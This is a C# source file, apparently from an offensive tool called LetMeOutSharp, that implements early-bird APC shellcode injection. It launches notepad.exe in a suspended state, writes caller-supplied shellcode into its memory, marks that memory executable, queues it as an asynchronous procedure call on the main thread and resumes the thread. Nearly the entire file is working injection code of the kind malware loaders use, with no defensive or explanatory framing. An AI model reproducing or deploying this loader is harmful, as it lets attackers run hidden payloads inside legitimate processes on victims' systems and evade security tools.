using System.Runtime.InteropServices;
using System;

namespace LetMeOutSharp
{
	public class ApcInjectionNewProcess
	{
		public ApcInjectionNewProcess(byte[] shellcode)
		{

			// Target process to inject into
			string processpath = @"C:\Windows\notepad.exe";
			if (Utilities.Is64BitProcess.Equals("0"))
			{
				processpath = @"c:\Windows\SysWOW64\notepad.exe";
			}
			STARTUPINFO si = new STARTUPINFO();
			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

			// Create new process in suspended state to inject into
			CreateProcess(processpath, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

			// Allocate memory within process and write shellcode
			IntPtr address = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
			IntPtr bytesWritten = IntPtr.Zero;
			WriteProcessMemory(pi.hProcess, address, shellcode, shellcode.Length, out bytesWritten);

			// Modify memory permissions on allocated shellcode
			uint oldProtect = 0;
			VirtualProtectEx(pi.hProcess, address, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

			// Open thread
			IntPtr thread = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);

			// Assign address of shellcode to the target thread apc queue
			QueueUserAPC(address, thread, IntPtr.Zero);

			// Resume the suspended thread
			ResumeThread(pi.hThread);
		}

		private static UInt32 MEM_COMMIT = 0x1000;
		private static UInt32 PAGE_READWRITE = 0x04;
		private static UInt32 PAGE_EXECUTE_READ = 0x20;

		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public uint dwProcessId;
			public uint dwThreadId;
		}

		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		[Flags]
		public enum ThreadAccess : int
		{
			TERMINATE = 0x0001,
			SUSPEND_RESUME = 0x0002,
			GET_CONTEXT = 0x0008,
			SET_CONTEXT = 0x0010,
			SET_INFORMATION = 0x0020,
			QUERY_INFORMATION = 0x0040,
			SET_THREAD_TOKEN = 0x0080,
			IMPERSONATE = 0x0100,
			DIRECT_IMPERSONATION = 0x0200
		}

		[DllImport("kernel32.dll")]
		private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("kernel32.dll")]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

		[DllImport("kernel32.dll")]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);

		[DllImport("kernel32.dll")]
		private static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

		[DllImport("kernel32.dll")]
		private static extern uint ResumeThread(IntPtr hThread);
	}
}
